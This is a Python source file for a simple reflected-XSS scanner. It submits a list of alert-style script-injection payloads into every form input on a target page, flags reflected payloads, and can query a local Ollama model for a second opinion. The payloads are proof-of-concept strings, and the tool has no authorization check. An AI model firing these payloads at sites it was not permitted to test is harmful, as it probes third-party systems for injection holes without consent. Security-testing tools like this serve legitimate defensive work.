# simple_scanner.py
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time
import json
from datetime import datetime
import os
import subprocess
import re

class SimpleNeuroScanner:
    def __init__(self, target_url, use_ai=True):
        self.target_url = target_url
        self.use_ai = use_ai
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'NeuroXSS/1.0'})
        
        # Payloads for testing
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<body onload=alert(1)>"
        ]
        
    def scan(self):
        print(f"[+] Scanning {self.target_url}")
        forms = self._get_forms()
        print(f"[+] Found {len(forms)} forms")
        
        vulnerabilities = []
        
        for form in forms:
            result = self._test_form(form)
            if result:
                vulnerabilities.extend(result)
        
        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'forms_tested': len(forms),
            'vulnerabilities': vulnerabilities
        }
    
    def _get_forms(self):
        try:
            r = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"Error getting forms: {e}")
            return []
    
    def _test_form(self, form):
        action = form.get('action', '')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        
        input_names = []
        for i in inputs:
            name = i.get('name')
            if name and i.get('type') != 'submit':
                input_names.append(name)
        
        if not input_names:
            return []
        
        results = []
        target = urljoin(self.target_url, action)
        
        for payload in self.payloads:
            data = {}
            for name in input_names:
                data[name] = payload
            
            try:
                if method == 'post':
                    r = self.session.post(target, data=data)
                else:
                    r = self.session.get(target, params=data)
                
                # Check if vulnerable
                if payload in r.text:
                    vuln = {
                        'type': 'XSS',
                        'payload': payload,
                        'url': target,
                        'method': method,
                        'parameters': input_names,
                        'confidence': 70 if self.use_ai else 50
                    }
                    
                    # Add AI analysis if enabled
                    if self.use_ai:
                        ai_result = self._analyze_with_ai(payload, r.text)
                        vuln['ai_analysis'] = ai_result
                    
                    results.append(vuln)
                    print(f"  [!] Found potential XSS with: {payload[:30]}...")
                
                time.sleep(0.5)
                
            except Exception as e:
                print(f"Error: {e}")
                continue
        
        return results
    
    def _analyze_with_ai(self, payload, response):
        """Simple AI analysis using Ollama"""
        ollama_path = os.path.expandvars(r"%LOCALAPPDATA%\Programs\Ollama\ollama.exe")
        
        prompt = f"""Analyze if this is an XSS vulnerability:
Payload: {payload}
Response snippet: {response[:500]}

Is this a real vulnerability? Answer YES or NO and why."""

        try:
            # Try API first
            try:
                r = requests.post("http://localhost:11434/api/generate", 
                                json={"model": "gpt-oss:20b", "prompt": prompt, "stream": False},
                                timeout=10)
                if r.status_code == 200:
                    return r.json().get('response', 'AI analysis complete')
            except:
                pass
            
            # Try CLI
            result = subprocess.run(
                [ollama_path, "run", "gpt-oss:20b", prompt],
                capture_output=True,
                text=True,
                timeout=20
            )
            return result.stdout[:200]
            
        except Exception as e:
            return f"AI analysis unavailable: {e}"

def main():
    import argparse
    parser = argparse.ArgumentParser(description='Simple NeuroXSS Scanner')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('--no-ai', action='store_true', help='Disable AI')
    parser.add_argument('--output', '-o', default='scan_results.json', help='Output file')
    
    args = parser.parse_args()
    
    print("\n" + "="*60)
    print("SIMPLE NEUROXSS SCANNER")
    print("="*60)
    print(f"Target: {args.url}")
    print(f"AI Analysis: {'Disabled' if args.no_ai else 'Enabled'}")
    print("-"*60)
    
    scanner = SimpleNeuroScanner(args.url, use_ai=not args.no_ai)
    results = scanner.scan()
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    print(f"Target: {results['target']}")
    print(f"Forms tested: {results['forms_tested']}")
    print(f"Vulnerabilities found: {len(results['vulnerabilities'])}")
    
    if results['vulnerabilities']:
        print("\nVulnerability Details:")
        for i, v in enumerate(results['vulnerabilities'], 1):
            print(f"\n{i}. XSS at {v['url']}")
            print(f"   Payload: {v['payload'][:50]}")
            print(f"   Confidence: {v['confidence']}%")
            if 'ai_analysis' in v:
                print(f"   AI: {v['ai_analysis'][:100]}...")
    
    # Save results
    with open(args.output, 'w') as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Results saved to {args.output}")

if __name__ == "__main__":
    main()